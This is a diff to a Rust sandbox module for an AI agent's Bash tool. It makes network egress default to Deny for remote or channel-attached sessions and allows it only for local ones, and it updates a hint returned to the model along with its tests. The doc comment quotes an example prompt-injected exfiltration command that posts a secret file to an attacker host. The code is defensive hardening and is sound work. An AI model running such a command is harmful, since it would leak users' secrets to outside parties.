@@ -39,14 +39,23 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 /// (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `GENESIS_VAULT_*`, …) dropped
 /// unconditionally. `PATH` etc. still pass through so commands work.
 ///
-/// **Network (M-3 / M-7 / sandbox-2 / tools-exec-15):** agent-initiated
-/// Bash now DEFAULTS to [`NetworkPolicy::Deny`]. The credential denylist has
-/// zero network-egress patterns, so under the old `Inherit` default a
-/// prompt-injected command (`curl --data-binary @secret https://attacker`)
-/// could exfiltrate any sandbox-readable data and reach internal/metadata
-/// endpoints even while FS/syscall confinement held. Egress is now opt-in:
-/// set `GENESIS_BASH_ALLOW_NETWORK=1` to restore full host network for
-/// network-dependent commands (`git fetch`, package installs, `curl`).
+/// **Network (M-3 / M-7 / sandbox-2 / tools-exec-15 / #657):** agent-initiated
+/// Bash egress is gated on whether this is a GENUINELY-LOCAL session, NOT on
+/// the workspace trust posture. [`NetworkPolicy::Inherit`] (so `git fetch`,
+/// package installs, and `curl` just work) is granted ONLY when the session
+/// has no channel tool posture (`channel_tool_posture.is_none()`, i.e. a local
+/// CLI/TUI/json-stream/ACP/desktop entrypoint), via the `local_bash_network`
+/// helper and the `with_network` grant applied at bootstrap. This distinction
+/// is load-bearing: a channel-attached session (including a `Full`-posture
+/// remote sender) also resolves to `WorkspaceTrust::Trusted` through
+/// `trusted_local`, so gating on trust alone would hand a remote sender a
+/// networked shell. Every channel path therefore stays on the fail-safe
+/// [`NetworkPolicy::Deny`] lockdown, so a prompt-injected or remote command
+/// (`curl --data-binary @secret https://attacker`) cannot exfiltrate
+/// sandbox-readable data or reach internal/metadata endpoints. On any
+/// non-local session `GENESIS_BASH_ALLOW_NETWORK=1` is the explicit operator
+/// opt-in (via [`default_bash_network_policy`]); when no WorkspacePolicy is
+/// attached at all, the conservative default is Deny.
 ///
 /// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
 /// sandbox-exec) actually enforce this. `NoSandboxBackend` ignores the
@@ -247,11 +256,14 @@ fn annotate_network_block(
     if result.is_error && matches!(policy, NetworkPolicy::Deny) && looks_network_dependent(command)
     {
         result.content.push_str(
-            "\n\n⚠ The Bash sandbox has NO NETWORK, so this command could not reach the \
-             network (that is why the output is empty). Do NOT retry with curl/wget. To \
-             read a URL, use the WebFetch tool; to search the web, use the `web` tool with \
-             operation \"search\". (To allow Bash network access, the user can set \
-             GENESIS_BASH_ALLOW_NETWORK=1.)",
+            "\n\n⚠ Bash network egress is OFF for this workspace (an untrusted / contained \
+             workspace denies network to prevent data exfiltration), so this command could \
+             not reach the network — that is why it failed. This is NOT a missing tool: do \
+             NOT claim that a package manager, node/npm, git, curl, or the Command Line \
+             Tools are absent or need installing, and do not invent any other cause. To \
+             enable installs, the user can run this on a trusted workspace or set \
+             GENESIS_BASH_ALLOW_NETWORK=1 to approve egress. To read a URL now, use the \
+             WebFetch tool; to search the web, use the `web` tool with operation \"search\".",
         );
         result.is_error = true;
     }
@@ -1169,24 +1181,30 @@ mod tests {
         let r = annotate_network_block("curl -sL https://x.y", NetworkPolicy::Deny, failed());
         assert!(r.is_error);
         assert!(
-            r.content.contains("NO NETWORK")
+            r.content.contains("network egress is OFF")
                 && r.content.contains("WebFetch")
                 && r.content.contains("`web`"),
             "hint must explain the block and point to WebFetch + the `web` search tool:\n{}",
+            r.content
+        );
+        // #657: the hint must forbid fabricating a missing-tool cause.
+        assert!(
+            r.content.contains("NOT a missing tool") && r.content.contains("do NOT claim"),
+            "hint must tell the model not to invent a missing-tool remedy:\n{}",
             r.content
         );
 
         // Network ALLOWED → no hint (the failure was something else).
         let r = annotate_network_block("curl -sL https://x.y", NetworkPolicy::Inherit, failed());
         assert!(
-            !r.content.contains("NO NETWORK"),
+            !r.content.contains("network egress is OFF"),
             "no hint when network allowed"
         );
 
         // Denied but NOT a network command → no hint (don't mislead).
         let r = annotate_network_block("false", NetworkPolicy::Deny, failed());
         assert!(
-            !r.content.contains("NO NETWORK"),
+            !r.content.contains("network egress is OFF"),
             "no hint for non-network command"
         );
 
@@ -1196,7 +1214,10 @@ mod tests {
             is_error: false,
         };
         let r = annotate_network_block("curl -sL https://x.y", NetworkPolicy::Deny, ok);
-        assert!(!r.content.contains("NO NETWORK"), "no hint on success");
+        assert!(
+            !r.content.contains("network egress is OFF"),
+            "no hint on success"
+        );
     }
 
     // ── #413: powershell → cmd downgrade under a powershell-blocking sandbox ──
@@ -1317,12 +1338,86 @@ mod tests {
         let (m, cmd) = build_sandbox_pieces("echo hi", Some(&policy));
         assert_eq!(cmd.cwd.as_deref(), Some(policy.root()));
         assert!(m.fs_write_allow.iter().any(|p| p == policy.root()));
-        // Trusted preserves the network opt-in default (Deny) and injects no
-        // CARGO_HOME redirect.
+        // #657 (Overwatch ruling, Sean-confirmed): the bare `trusted_local`
+        // constructor is fail-safe — network follows default_bash_network_policy
+        // (Deny in a test env with no opt-in). The `Inherit` grant is applied at
+        // bootstrap for genuinely-local sessions via `with_network`; see the
+        // trusted-local-grant assertion below. No CARGO_HOME redirect either way.
         assert_eq!(m.network, default_bash_network_policy());
         assert!(!m.env.iter().any(|(k, _)| k == "CARGO_HOME"));
         // secrets still stripped from base env (unchanged)
         assert!(!m.env.iter().any(|(k, _)| k.contains("TOKEN")));
+        // The bootstrap local-grant path (with_network Inherit) reaches the
+        // manifest: a genuinely-local Trusted workspace runs with host network.
+        let local = policy.with_network(NetworkPolicy::Inherit);
+        let (ml, _) = build_sandbox_pieces("echo hi", Some(&local));
+        assert_eq!(ml.network, NetworkPolicy::Inherit);
+    }
+
+    /// #657 LIVE local-verify (Overwatch ruling). Ignored by default — needs a
+    /// real network-capable sandbox backend (bwrap on Linux) and outbound
+    /// network. Run on Hetzner with:
+    ///   cargo test -p wcore-tools --lib bash::tests::live_ -- --ignored --nocapture
+    ///
+    /// Proves the end-to-end wiring my change touches: the derived
+    /// `NetworkPolicy` (Inherit for a genuinely-local session, Deny for a
+    /// channel-attached one) feeds the real backend and actually governs egress.
+    /// A genuinely-local session (with_network Inherit) → curl CONNECTS; a
+    /// channel-attached session (fail-safe default = Deny) → curl is BLOCKED.
+    ///
+    /// Uses an IP target (`1.1.1.1`, `-k` for the SNI cert mismatch) to isolate
+    /// the network-namespace gate my change controls. Name resolution is a
+    /// SEPARATE, pre-existing sandbox-fs concern: bwrap ro-binds `/etc` but not
+    /// `/run`, so a systemd-resolved host (`/etc/resolv.conf -> /run/...stub`)
+    /// dangles the symlink and breaks DNS inside the sandbox even under Inherit
+    /// — orthogonal to #657 and out of its scope.
+    #[cfg(unix)]
+    #[tokio::test]
+    #[ignore = "live network + real sandbox backend (Hetzner) — run with --ignored"]
+    async fn live_local_egress_on_channel_egress_blocked() {
+        use crate::workspace_policy::{WorkspacePolicy, local_bash_network};
+        let dir = tempfile::tempdir().unwrap();
+        let backend = default_for_platform();
+
+        let curl = "curl -sk -m 8 -o /dev/null -w '%{http_code}' https://1.1.1.1";
+
+        // Genuinely-local session: local_bash_network(false) => Inherit.
+        let local =
+            WorkspacePolicy::trusted_local(dir.path()).with_network(local_bash_network(false));
+        assert_eq!(local.network(), NetworkPolicy::Inherit);
+        let (m, cmd) = build_sandbox_pieces(curl, Some(&local));
+        let out = backend.execute(&m, cmd).await.expect("local exec");
+        eprintln!(
+            "LOCAL exit={} stdout={:?}",
+            out.exit_code,
+            String::from_utf8_lossy(&out.stdout)
+        );
+        assert_eq!(
+            out.exit_code, 0,
+            "genuinely-local session must reach the network"
+        );
+        let code = String::from_utf8_lossy(&out.stdout).trim().to_string();
+        assert!(
+            code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) && code != "000",
+            "local session should get a real HTTP response code from 1.1.1.1, got {code:?}"
+        );
+
+        // Channel-attached session (incl Full): local_bash_network(true) =>
+        // fail-safe default (Deny in this env — no GENESIS_BASH_ALLOW_NETWORK).
+        let channel =
+            WorkspacePolicy::trusted_local(dir.path()).with_network(local_bash_network(true));
+        assert_eq!(channel.network(), default_bash_network_policy());
+        let (m2, cmd2) = build_sandbox_pieces(curl, Some(&channel));
+        let out2 = backend.execute(&m2, cmd2).await.expect("channel exec");
+        eprintln!(
+            "CHANNEL exit={} stderr={:?}",
+            out2.exit_code,
+            String::from_utf8_lossy(&out2.stderr)
+        );
+        assert_ne!(
+            out2.exit_code, 0,
+            "a channel-attached session must be denied network egress"
+        );
     }
 
     #[test]
